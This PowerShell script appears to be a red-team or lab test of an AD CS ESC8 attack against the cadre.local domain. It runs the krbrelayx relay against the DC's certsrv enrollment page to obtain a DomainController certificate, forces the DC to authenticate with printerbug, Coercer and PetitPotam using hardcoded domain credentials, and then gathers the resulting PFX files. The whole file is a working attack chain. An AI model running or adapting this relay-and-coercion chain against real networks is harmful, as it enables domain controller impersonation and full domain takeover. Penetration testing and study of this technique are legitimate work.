# ESC8 krbrelayx live coercion test (HTTP :80 listener on ws01)
$ErrorActionPreference = "Continue"
$py = "C:\Tools\krbrelayx-venv\Scripts\python.exe"
$coercer = "C:\Tools\RedStrike\.venv\Scripts\coercer.exe"
$work = "C:\Tools\cadre-attack"
$outdir = "$work\esc8-krb"
New-Item -ItemType Directory -Force -Path $outdir | Out-Null

& "$work\esc8-krbrelayx-patch.ps1"

$relayLog = "$outdir\live-relay.log"
$relayErr = "$outdir\live-relay.err"
Remove-Item $relayLog,$relayErr -ErrorAction SilentlyContinue

$p = Start-Process -FilePath $py -ArgumentList @(
  "C:\Tools\krbrelayx\krbrelayx.py",
  "-t","http://dc01.cadre.local/certsrv/certfnsh.asp",
  "--adcs","--template","DomainController",
  "-v","dc01$",
  "-ip","192.168.77.62",
  "-debug"
) -WorkingDirectory $work -PassThru -WindowStyle Hidden `
  -RedirectStandardOutput $relayLog -RedirectStandardError $relayErr

Write-Output "krbrelay_pid=$($p.Id)"
Start-Sleep -Seconds 12
Write-Output "listen80=$([bool](Get-NetTCPConnection -LocalPort 80 -State Listen -ErrorAction SilentlyContinue))"

Write-Output "=== printerbug ==="
& $py C:\Tools\krbrelayx\printerbug.py "cadre.local/chief_command:C0mm@nd_Ch1ef!@192.168.77.10" esc8relay.cadre.local 2>&1

Write-Output "=== coercer MS-RPRN hostname listener ==="
& $coercer coerce -u chief_command -p "C0mm@nd_Ch1ef!" -d cadre.local --dc-ip 192.168.77.10 `
  -t 192.168.77.10 -l esc8relay.cadre.local `
  --filter-protocol-name MS-RPRN --auth-type smb --always-continue 2>&1

Write-Output "=== impacket PetitPotam ==="
$pp = "$py -m impacket.examples.PetitPotam"
if (Test-Path "C:\Tools\krbrelayx-venv\Scripts\PetitPotam.py") {
  & $py C:\Tools\krbrelayx-venv\Scripts\PetitPotam.py esc8relay.cadre.local 192.168.77.10 2>&1
} else {
  Get-ChildItem C:\Tools\krbrelayx-venv\Scripts -Filter *Petit* 2>&1
}

Start-Sleep -Seconds 25
Write-Output "=== relay log tail ==="
Get-Content $relayLog -Tail 30 -ErrorAction SilentlyContinue
Get-Content $relayErr -Tail 40 -ErrorAction SilentlyContinue

Write-Output "=== new PFX since test start ==="
Get-ChildItem $work -Filter *.pfx | Where-Object { $_.LastWriteTime -gt (Get-Date).AddMinutes(-5) } | ForEach-Object { $_.FullName }

if (-not $p.HasExited) { Stop-Process -Id $p.Id -Force }
